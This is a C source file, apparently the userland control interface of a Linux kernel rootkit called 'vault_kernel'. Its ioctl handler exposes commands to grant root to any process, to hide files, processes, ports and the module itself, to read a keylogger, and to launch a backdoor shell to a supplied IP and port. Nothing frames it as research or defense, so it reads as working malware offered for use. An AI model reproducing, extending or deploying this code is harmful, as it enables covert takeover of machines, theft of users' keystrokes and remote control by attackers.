/* vault_kernel - ioctl.c
 * Character device interface for userland control
 * ruby570bocadito © 2026
 */
#include "core.h"

static dev_t vault_kernel_dev;
static struct class *vault_kernel_class = NULL;
static struct cdev vault_kernel_cdev;
static int dev_major = 0;

static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
                           unsigned long arg) {
    char kbuf[4096];
    int ret, pid_int;
    uint16_t port;
    char *ip, *port_str;

    switch (cmd) {

    case IOCTL_GIVE_ROOT:
        if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
            return -EFAULT;
        if (pid_int == 0)
            pid_int = current->pid; /* Default to caller */
        return priv_esc_give_root(pid_int);

    case IOCTL_HIDE_FILE:
        if (copy_from_user(kbuf, (char __user *)arg, 256))
            return -EFAULT;
        kbuf[255] = '\0';
        file_hide_add(kbuf);
        break;

    case IOCTL_UNHIDE_FILE:
        if (copy_from_user(kbuf, (char __user *)arg, 256))
            return -EFAULT;
        kbuf[255] = '\0';
        file_hide_del(kbuf);
        break;

    case IOCTL_HIDE_PID:
        if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
            return -EFAULT;
        proc_hide_add(pid_int);
        break;

    case IOCTL_UNHIDE_PID:
        if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
            return -EFAULT;
        proc_hide_del(pid_int);
        break;

    case IOCTL_HIDE_PORT:
        if (copy_from_user(&port, (uint16_t __user *)arg, sizeof(uint16_t)))
            return -EFAULT;
        net_hide_add_port(port);
        break;

    case IOCTL_UNHIDE_PORT:
        if (copy_from_user(&port, (uint16_t __user *)arg, sizeof(uint16_t)))
            return -EFAULT;
        net_hide_del_port(port);
        break;

    case IOCTL_LIST_HIDDEN: {
        char *p = kbuf;
        size_t remaining;
        int i;
        memset(kbuf, 0, sizeof(kbuf));

        remaining = sizeof(kbuf);
        p += snprintf(p, remaining, "--- Hidden PIDs ---\n");
        remaining = sizeof(kbuf) - (p - kbuf);
        for (i = 0; i < hidden_pid_count && remaining > 32; i++) {
            p += snprintf(p, remaining, "  pid: %d\n", hidden_pids[i]);
            remaining = sizeof(kbuf) - (p - kbuf);
        }

        if (remaining > 32) {
            p += snprintf(p, remaining, "--- Hidden Files ---\n");
            remaining = sizeof(kbuf) - (p - kbuf);
        }
        for (i = 0; i < hidden_file_count && remaining > 32; i++) {
            p += snprintf(p, remaining, "  %s\n", hidden_files[i]);
            remaining = sizeof(kbuf) - (p - kbuf);
        }

        if (remaining > 32) {
            p += snprintf(p, remaining, "--- Hidden Ports ---\n");
            remaining = sizeof(kbuf) - (p - kbuf);
        }
        for (i = 0; i < hidden_port_count && remaining > 32; i++) {
            p += snprintf(p, remaining, "  port: %d\n",
                          ntohs(hidden_ports[i]));
            remaining = sizeof(kbuf) - (p - kbuf);
        }

        if (copy_to_user((char __user *)arg, kbuf, sizeof(kbuf)))
            return -EFAULT;
        break;
    }

    case IOCTL_KEYLOG_READ:
        ret = keylogger_read((char __user *)arg, 4096);
        if (ret < 0)
            return ret;
        break;

    case IOCTL_KEYLOG_CLEAR:
        keylogger_clear();
        break;

    case IOCTL_BACKDOOR_SHELL:
        if (copy_from_user(kbuf, (char __user *)arg, 256))
            return -EFAULT;
        kbuf[255] = '\0';
        ip = kbuf;
        port_str = strchr(kbuf, ':');
        if (!port_str)
            return -EINVAL;
        *port_str++ = '\0';
        ret = backdoor_trigger_shell(ip, port_str);
        if (ret < 0)
            return ret;
        break;

    case IOCTL_BACKDOOR_MAGIC:
        if (copy_from_user(kbuf, (char __user *)arg, 16))
            return -EFAULT;
        kbuf[15] = '\0';
        backdoor_set_magic(kbuf);
        break;

    case IOCTL_MODULE_HIDE:
        stealth_hide_module();
        break;

    case IOCTL_MODULE_UNHIDE:
        stealth_unhide_module();
        break;

    default:
        return -ENOTTY;
    }

    return 0;
}

static int vault_kernel_open(struct inode *inode, struct file *file) {
    return 0;
}

static int vault_kernel_release(struct inode *inode, struct file *file) {
    return 0;
}

static struct file_operations vault_kernel_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = vault_kernel_ioctl,
    .open           = vault_kernel_open,
    .release        = vault_kernel_release,
};

int ioctl_init(void) {
    int ret;

    /* Allocate device number */
    ret = alloc_chrdev_region(&vault_kernel_dev, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        pr_err(VAULT_KERNEL_TAG " failed to allocate chrdev (%d)\n", ret);
        return ret;
    }
    dev_major = MAJOR(vault_kernel_dev);

    /* Create device class (visible in /sys/class) */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)
    vault_kernel_class = class_create(DEVICE_NAME);
#else
    vault_kernel_class = class_create(THIS_MODULE, DEVICE_NAME);
#endif
    if (IS_ERR(vault_kernel_class)) {
        unregister_chrdev_region(vault_kernel_dev, 1);
        return PTR_ERR(vault_kernel_class);
    }

    /* Create device node */
    if (!device_create(vault_kernel_class, NULL, vault_kernel_dev,
                       NULL, DEVICE_NAME)) {
        class_destroy(vault_kernel_class);
        unregister_chrdev_region(vault_kernel_dev, 1);
        return -ENODEV;
    }

    /* Initialize cdev */
    cdev_init(&vault_kernel_cdev, &vault_kernel_fops);
    ret = cdev_add(&vault_kernel_cdev, vault_kernel_dev, 1);
    if (ret) {
        device_destroy(vault_kernel_class, vault_kernel_dev);
        class_destroy(vault_kernel_class);
        unregister_chrdev_region(vault_kernel_dev, 1);
        return ret;
    }

    pr_info(VAULT_KERNEL_TAG " char device /dev/%s (major %d)\n",
            DEVICE_NAME, dev_major);
    return 0;
}

void ioctl_cleanup(void) {
    cdev_del(&vault_kernel_cdev);
    device_destroy(vault_kernel_class, vault_kernel_dev);
    class_destroy(vault_kernel_class);
    unregister_chrdev_region(vault_kernel_dev, 1);

    pr_info(VAULT_KERNEL_TAG " char device removed\n");
}
